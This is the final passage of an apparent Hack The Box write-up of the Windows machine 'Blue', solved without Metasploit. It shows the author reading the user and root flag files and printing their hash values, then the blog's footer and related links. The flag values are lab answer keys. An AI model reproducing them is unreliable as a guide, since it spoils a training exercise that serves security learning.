+</pre></table></code></div></div><p>Nice, we got <code class="language-plaintext highlighter-rouge">SYSTEM</code>!</p><h1 id="usertxt">user.txt</h1><p>The user flag is located at the desktop of <code class="language-plaintext highlighter-rouge">haris</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>C:\Users\haris\Desktop&gt; type user.txt
+4c546aea7dbee75cbd71de245c8deea9
+</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>The root flag is located at the desktop of <code class="language-plaintext highlighter-rouge">Administrator</code>, as always.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>C:\Users\Administrator\Desktop&gt; type root.txt
+ff548eb71e920ff6c08843ce9df4e717
+</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/eternalblue/" class="post-tag no-text-decoration" >eternalblue</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Blue (Without Metasploit) - rizemon's blog&url=https://rizemon.github.io/posts/blue-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Blue (Without Metasploit) - rizemon's blog&u=https://rizemon.github.io/posts/blue-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Blue (Without Metasploit) - rizemon's blog&url=https://rizemon.github.io/posts/blue-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/legacy-htb/"><div class="card-body"> <span class="timeago small" > Jan 12, 2021 <i class="unloaded">2021-01-12T14:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Legacy (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/heist-htb/"><div class="card-body"> <span class="timeago small" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Heist</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/legacy-htb/" class="btn btn-outline-primary"><p>Hack The Box - Legacy (Without Metasploit)</p></a> <a href="/posts/devel-htb/" class="btn btn-outline-primary"><p>Hack The Box - Devel (Without Metasploit)</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
